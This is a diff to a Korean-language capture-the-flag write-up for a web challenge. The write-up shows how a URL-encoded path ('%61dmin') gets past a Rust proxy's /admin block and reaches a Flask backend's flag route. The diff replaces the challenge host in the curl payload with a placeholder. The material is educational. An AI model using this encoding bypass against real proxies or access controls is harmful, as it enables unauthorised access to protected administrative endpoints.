@@ -27,7 +27,7 @@ Rust 프록시는 `/admin` 경로를 차단하지만, **URL 인코딩된 경로*
 프록시는 그냥 통과시키고, 뒤의 Flask 백엔드가 `%61` → `a` 로 디코딩해 `/admin/flag` 로 라우팅 → 플래그 획득.
 
 ```bash
-curl "http://rusty-proxy.chals.bitskrieg.in:25001/%61dmin/flag"
+curl "url/%61dmin/flag"
 ```
 
 ---
@@ -158,11 +158,13 @@ def vault():
 
 ```bash
 # 기본 페이로드 — 'a' 를 %61 로 인코딩
-curl "http://rusty-proxy.chals.bitskrieg.in:25001/%61dmin/flag"
+curl "url/%61dmin/flag"
 ```
 
 ```json
 {"flag": "BITSCTF{...}"}
 ```
+---
+<img width="517" height="42" alt="image" src="https://github.com/user-attachments/assets/bd8fa58d-214f-4ea9-b28e-55081abb287f" />
 
 ---
